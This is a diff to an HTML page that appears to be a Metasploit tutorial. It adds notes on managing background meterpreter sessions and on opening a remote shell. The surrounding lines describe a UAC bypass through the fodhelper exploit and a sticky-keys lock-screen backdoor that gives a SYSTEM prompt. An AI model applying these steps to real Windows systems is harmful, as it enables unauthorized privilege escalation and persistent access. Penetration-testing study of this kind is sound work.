@@ -10,6 +10,11 @@
   <ul>getuid</ul>
   <ul>background</ul>
 </ol>
+<p>Note: to return to the active session when it is running in background is:</p>
+<p><ol>
+ <ul>sessions -i* -> show active background sessions</ul>
+ <ul>sessions -i 1 -> return to the first background session</ul>
+</ol>
 <p>The meterpreter session is running on the background. Now, type search bypassuac to get the list of bypassuac modules. We wil bypass Windows UAC 
   protection via the FodHelper Registry Key, which is present in Metasploit as bypassuac_fodhelper exploit.</p>
 <p><ol>
@@ -32,4 +37,11 @@
   <ul>exploit</ul>
 </ol>
 <p>When a Windows computer is locked, press Shift key 5 times, which will open a command prompt on the lock screen with system privileges</p>
+<h2>Running a shell</h2>
+<p>You can run a shell on the remote computer in a session (NOT a background session):</p>
+<p><ol>
+ <ul>meterpreter > shell</ul>
+ <ul>exit</ul>
+ <ul>background -> now you can run Metasploit actions again</ul>
+</ol></p>
 
